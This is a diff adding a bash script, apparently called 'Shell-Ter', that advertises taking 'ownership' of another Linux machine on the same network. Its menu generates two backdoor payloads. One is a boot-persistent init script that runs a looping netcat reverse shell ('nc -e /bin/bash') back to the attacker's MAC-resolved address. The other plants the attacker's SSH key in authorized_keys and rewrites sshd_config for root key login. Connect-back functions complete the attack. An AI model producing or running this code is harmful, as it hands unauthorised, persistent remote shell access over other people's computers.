@@ -1,0 +1,153 @@
+#!/bin/bash
+function ssh_method_ownership { clear
+echo -n "Enter IP Address of the Victim: "
+read ip_addr
+ssh $ip_addr -y
+}
+
+
+function netcat_method_ownership { clear
+echo -n "Enter IP Address of the Victim: "
+read ip_addr
+echo -n "Enter Port Number(4444-5555): "
+read $port
+nc -nl $ip_addr $port 
+
+}
+
+
+function netcat_method_payload { clear
+mac=$(cat /sys/class/net/wlan0/address)
+echo '#!/bin/bash
+mv script /etc/init.d/
+update-rc.d script defaults
+update-rc.d script enable
+### BEGIN INIT INFO
+# Provides:          script
+# Required-Start:    $remote_fs $syslog
+# Required-Stop:     $remote_fs $syslog
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+# Short-Description: Start daemon at boot time
+# Description:       Enable service provided by daemon.
+### END INIT INFO
+mkdir ~/Desktop/TEST
+while true
+do
+	ip -s -s neigh flush all
+	ip=$(cat /proc/net/arp | grep MYMAC | cut -d\  -f 1)
+	while [ -z $ip ]
+	do      
+		ip=$(cat /proc/net/arp | grep MYMAC | cut -d\  -f 1)
+	done
+	while (true)
+	do
+		nc $ip -w1 -e /bin/bash 4444-5555
+	done
+done'>script
+
+sed -i -e "s/MYMAC/$mac/g" script
+echo -n "Creating Payload"
+				sleep 0.25 && echo -n "." 
+				sleep 0.25 && echo -n "."
+				sleep 0.25 && echo -n "."
+				sleep 0.25 && echo -n "."
+				sleep 0.25 && echo -n "."
+				sleep 0.25 && echo -n "."
+				echo "DONE ! "
+
+}
+
+function ssh_method_payload {	clear
+				mkdir -p ~/.ssh
+				echo "Hit Enter (Mandatory)"
+				ssh-keygen -t rsa
+				pub="$(cat /root/.ssh/id_rsa.pub)"
+				create_ssh_script pub
+				echo -n "Creating Payload"
+				sleep 0.25 && echo -n "." 
+				sleep 0.25 && echo -n "."
+				sleep 0.25 && echo -n "."
+				sleep 0.25 && echo -n "."
+				sleep 0.25 && echo -n "."
+				sleep 0.25 && echo -n "."
+				echo "DONE ! "
+}
+function create_ssh_script()
+{
+	touch script
+	echo "service ssh start
+	update-rc.d ssh enable
+	mkdir -p ~/.ssh
+	touch ~/.ssh/authorized_keys
+	echo '$pub'>~/.ssh/authorized_keys
+
+	echo 'LoginGraceTime 2m
+	PermitRootLogin prohibit-password
+	StrictModes yes
+	MaxAuthTries 6
+	MaxSessions 2
+
+	PubKeyAuthentication yes
+
+	AuthorizedKeysFile	~/.ssh/authorized_keys'>>/etc/ssh/sshd_config">script
+
+}
+
+
+
+clear
+sleep 0.25 && echo   "  _____ __ __    ___  _      _             ______    ___  ____    " 
+sleep 0.10 && echo   " / ___/|  |  |  /  _]| |    | |           |      |  /  _]|    \  "
+sleep 0.25 && echo   "(   \_ |  |  | /  [_ | |    | |     _____ |      | /  [_ |  D  )"
+sleep 0.10 && echo   " \__  ||  _  ||    _]| |___ | |___ |     ||_|  |_||    _]|    /  "
+sleep 0.25 && echo   " /  \ ||  |  ||   [_ |     ||     ||_____|  |  |  |   [_ |    \  "
+sleep 0.10 && echo   " \    ||  |  ||     ||     ||     |         |  |  |     ||  .  \ "
+sleep 0.25 && echo   "  \___||__|__||_____||_____||_____|         |__|  |_____||__|\_|  "
+echo   "                                                                  "                                                                
+echo   "                                                                  "
+echo   "                                                                  "
+echo   "                                                                  "
+sleep 0.20 && echo   "Take OwnerShip of another Linux Operating System within same Network"
+echo   "                                                                  "
+echo   "                                                                  "
+echo   "                                                                  "
+echo   "                                                                  "
+echo   "                                                                  "
+sleep 0.25 && echo "Select Your Option"
+sleep 0.25 && echo "1.Create Payload"
+sleep 0.25 && echo "2.Take Ownership"
+echo -n "Option: " 
+read ch
+clear
+case $ch in
+	1 ) echo "1.SSH Method" 
+	    echo "2.Netcat Method(Stealthy)"
+	    echo -n "Option: " 
+	    read ch1
+            clear
+	    	case $ch1 in
+			1) ssh_method_payload;;
+			2) netcat_method_payload;;
+			*) echo "Option not found. Exiting !" 
+			   exit 1;;
+		esac;;
+	2 ) echo "1.SSH Method" 
+	    echo "2.Netcat Method(Stealthy)" 
+	    echo -n "Option: "
+	    read ch1
+	    clear
+		case $ch1 in
+			1) ssh_method_ownership;;
+			2) netcat_method_ownership;;
+			*) echo "Option not found. Exiting !" 
+			   exit 1;;
+		esac;; 
+	* ) echo "Option not found. Exiting !" 
+	    exit 1;;
+esac	 
+
+
+
+
+				
